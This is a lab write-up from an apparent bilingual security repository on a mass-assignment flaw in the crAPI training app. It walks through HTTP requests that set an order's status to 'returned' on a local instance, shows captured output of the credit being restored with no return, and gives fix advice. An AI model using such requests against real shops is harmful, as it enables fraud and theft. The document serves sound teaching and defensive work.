[🇧🇷 Português](../../vulnerabilidades/04-mass-assignment.md) · 🇺🇸 English

# Mass Assignment — Refund for an item never returned

**OWASP API Security Top 10 (2023) category:** `API3 — Broken Object Property Level Authorization (Mass Assignment)`
**Severity (CVSS v3.1):** `Medium · 6.5` — `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N`
**Matching crAPI challenge:** Challenge 8 — "get an item for free" / Challenge 9 — "increase balance by $1,000+"

---

## 1. Summary

An order-editing endpoint accepts, in the request body, **properties that should not be controlled by the client** — such as the order status. By changing an order's status to "returned"/"refunded" without having returned anything, the attacker gets the credit back and keeps the item for free.

## 2. Preconditions

- An authenticated account with at least one **order** already placed in the crAPI shop.
- The **order ID** (obtained by listing your own orders).

## 3. Exploitation walkthrough

1. List your orders and grab the `order_id` and current state:

```http
GET /workshop/api/shop/orders HTTP/1.1
Host: localhost:8888
Authorization: Bearer <token>
```

2. Edit the order through the "shadow" endpoint `PUT /workshop/api/shop/orders/{order_id}`, sending the control property `status` in the body — which the client should not be able to set:

```http
PUT /workshop/api/shop/orders/{order_id} HTTP/1.1
Host: localhost:8888
Authorization: Bearer <token>
Content-Type: application/json

{ "status": "returned" }
```

3. The credit is returned without any validation of a physical return. Repeat to inflate the balance (Challenge 9).

## 4. Evidence

**Confirmed against the local instance** — capture in [`evidencias/04-mass-assignment/captura.txt`](../../../evidencias/04-mass-assignment/captura.txt).

```
credit before:  100.0
POST /workshop/api/shop/orders  {"product_id":1,"quantity":1}  -> purchase (credit 90.0, order id 7)
PUT  /workshop/api/shop/orders/7  {"status":"returned"}        -> HTTP 200, order status = "returned"
credit after:   100.0
```

The credit went from **90 back to 100** with no actual return: the item was free. The server accepted the client writing the `status` field directly.

## 5. Why it is a risk

It has a **direct financial impact**: the attacker gets products without paying and can inflate their own balance arbitrarily. The cause is binding the request body directly to the database model — internal fields like `status`, `balance`, or `role` end up writable by the client. It is one of the costliest flaws when it hits payment flows.

## 6. How to fix

- Explicitly define **which fields** the client may write on each endpoint (property allow-list / input DTOs), ignoring the rest.
- Treat sensitive state changes (order status, balance) as **server-controlled transitions**, never as free assignment coming from the payload.
- Test every write endpoint by injecting extra fields and check whether they are silently accepted.

## 7. References

- [API3:2023 Broken Object Property Level Authorization](https://owasp.org/API-Security/editions/2023/en/0xa3-broken-object-property-level-authorization/)
